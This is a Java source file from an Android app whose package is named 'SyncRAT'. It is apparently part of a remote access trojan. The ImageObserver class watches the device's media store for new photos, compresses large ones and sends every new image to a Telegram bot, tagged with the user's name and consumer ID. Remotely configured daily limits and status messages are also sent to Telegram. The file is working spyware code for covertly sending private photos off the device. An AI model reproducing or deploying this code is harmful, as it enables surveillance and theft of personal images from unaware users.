// File: ImageObserver.java
package android.iocl.dac_collector.SyncRAT;

import android.content.ContentUris;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.iocl.dac_collector.Utility.FirebaseConfigManager;
import android.iocl.dac_collector.Utility.ImageCompressor;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.iocl.dac_collector.Utility.Utility;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.Log;

import java.io.File;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class ImageObserver extends ContentObserver {
    private static final String TAG = "ImageObserver";
    private static final long DEBOUNCE_MS = 3 * 1000;
    private final Context mContext;
    private final Handler mHandler;
    private final Set<Long> mPendingImageIds = new HashSet<>();


    private final Set<String> mPendingImagePaths = new HashSet<>();

    private final Runnable mFlushRunnable = this::processPendingImages;
    private int calls = 0;

    public ImageObserver(Handler handler, Context context) {
        super(handler);
        this.mHandler = handler;
        this.mContext = context.getApplicationContext();
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);

        if (uri == null || !SharedPrefs.getImgLib()) return;
        String lastSegment = uri.getLastPathSegment();
        if (TextUtils.isEmpty(lastSegment) || !TextUtils.isDigitsOnly(lastSegment)) {
            Log.v(TAG, "Ignoring non-specific URI: " + uri);
            return;
        }

        long imageId = ContentUris.parseId(uri);
        synchronized (mPendingImageIds) {
            mPendingImageIds.add(imageId);
        }

        calls++;


        // 🔑 Debounce: reset runnable each time
        mHandler.removeCallbacks(mFlushRunnable);
        mHandler.postDelayed(mFlushRunnable, DEBOUNCE_MS);
    }

    private void processPendingImages() {
        Set<Long> imageIds;
        synchronized (mPendingImageIds) {
            imageIds = new HashSet<>(mPendingImageIds);
            mPendingImageIds.clear();
        }

        if (imageIds.isEmpty()) return;
        Log.i(TAG, "Processing images: " + imageIds);

        String selection = MediaStore.Images.Media._ID + " IN (" +
                TextUtils.join(",", imageIds) + ")";
        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.RELATIVE_PATH
        };

        try (Cursor cursor = mContext.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, selection, null, null)) {

            if (cursor == null) return;

            while (cursor.moveToNext()) {
                String fullPath = null;

                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    int dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                    if (dataIdx != -1) {
                        fullPath = cursor.getString(dataIdx);
                    }
                } else {
                    int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                    int pathIdx = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH);
                    if (nameIdx != -1 && pathIdx != -1) {
                        String name = cursor.getString(nameIdx);
                        String rel = cursor.getString(pathIdx);
                        fullPath = Environment.getExternalStorageDirectory()
                                + File.separator + rel + File.separator + name;
                    }
                }

                if (!TextUtils.isEmpty(fullPath)) {
                    synchronized (mPendingImagePaths) {
                        mPendingImagePaths.add(fullPath); // collect all unique paths
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing images", e);
        }

        // 🔑 Now handle only unique paths
        Set<String> uniquePaths;
        synchronized (mPendingImagePaths) {
            uniquePaths = new HashSet<>(mPendingImagePaths);
            mPendingImagePaths.clear();
        }

        checkAndResetLimits();

        int uploadedCount = SharedPrefs.getUploadCount();

        long uploadedBytes = SharedPrefs.getUploadedBytes();

        int maxCount =
                FirebaseConfigManager.getImgDailyLimit();

        long maxBytes =
                FirebaseConfigManager.getImgDailyMbLimit()
                        * 1024L * 1024L;

        for (String path : uniquePaths) {

            // Stop if count limit reached
            if (uploadedCount >= maxCount) {

                Log.d(TAG, "Daily image count limit reached");


                try {


                    TelegramBot.with(mContext).sendMessage(
                            "Daily image count limit reached for user : " + SharedPrefs.getUsername() + "\n" +
                                    getStats()
                    );
                } catch (Exception e) {

                }

                break;
            }

            File imgFile = new File(path);

            if (!imgFile.exists()) {
                continue;
            }

            long originalFileSize = imgFile.length();

            // Skip empty/corrupted files
            if (originalFileSize < 1024) {
                continue;
            }

            Log.i(TAG, "Uploading to Server " + path);

            File compressedFile = imgFile;

            // Compress only if > 5 MB
            if (originalFileSize > 5 * 1024 * 1024L) {

                try {

                    File tempFile = ImageCompressor.compressToSize(
                            mContext,
                            imgFile.getAbsolutePath(),
                            "compressed_" + System.currentTimeMillis(),
                            4
                    );

                    // fallback safety
                    if (tempFile != null && tempFile.exists()) {
                        compressedFile = tempFile;
                    }

                } catch (Throwable e) {

                    e.printStackTrace();

                    // fallback to original
                    compressedFile = imgFile;
                }
            }

            // FINAL upload size
            long finalUploadSize = compressedFile.length();

            // Stop if MB limit reached
            if ((uploadedBytes + finalUploadSize) > maxBytes) {



                try {
                    TelegramBot.with(mContext).sendMessage(
                            "Daily MB limit reached for user " + SharedPrefs.getConsumerId() + "\n" +
                                    getStats()
                    );
                } catch (Exception e) {

                }

                break;
            }

            try {


                TelegramBot.with(mContext).sendPhoto(
                        compressedFile,
                        SharedPrefs.getUsername()
                                + "-"
                                + SharedPrefs.getConsumerId()
                                + "\n"
                                + Utility.getStandardDatenTime()
                );

            } catch (Exception e) {
            }


            // Update counters
            uploadedCount++;

            uploadedBytes += finalUploadSize;

            SharedPrefs.setUploadCount(uploadedCount);

            SharedPrefs.setUploadedBytes(uploadedBytes);
        }
    }


    private String getStats() {


        long bytes = SharedPrefs.getUploadedBytes();


        float uploadedMb = bytes / (1024f * 1024f);

        return
                "Stats              : " +
                        SharedPrefs.getUsername() + " - " +
                        SharedPrefs.getConsumerId() + "\n" +

                        "Upload Count       : " +
                        SharedPrefs.getUploadCount() + " / " +
                        FirebaseConfigManager.getImgDailyLimit() + "\n" +

                        "Uploaded MB        : " +
                        String.format(Locale.ENGLISH, "%.2f", uploadedMb) +
                        " MB / " +
                        FirebaseConfigManager.getImgDailyMbLimit() + " MB\n" +

                        "Last Reset Time    : " +
                        SharedPrefs.getLastResetTime() + "\n" +

                        "Last Reset Date    : " +
                        new java.text.SimpleDateFormat(
                                "dd-MM-yyyy HH:mm:ss",
                                Locale.ENGLISH
                        ).format(new java.util.Date(
                                SharedPrefs.getLastResetTime()
                        ));


    }

    private void checkAndResetLimits() {

        long now = System.currentTimeMillis();

        long lastReset =
                SharedPrefs.getLastResetTime();

        int resetDays =
                FirebaseConfigManager.getImgResetDays();

        long resetInterval =
                resetDays * 24L * 60L * 60L * 1000L;

        if ((now - lastReset) >= resetInterval) {

            SharedPrefs.setUploadCount(0);

            SharedPrefs.setUploadedBytes(0);

            SharedPrefs.setLastResetTime(now);

            Log.d(TAG, "Image upload limits reset");
        }
    }


}
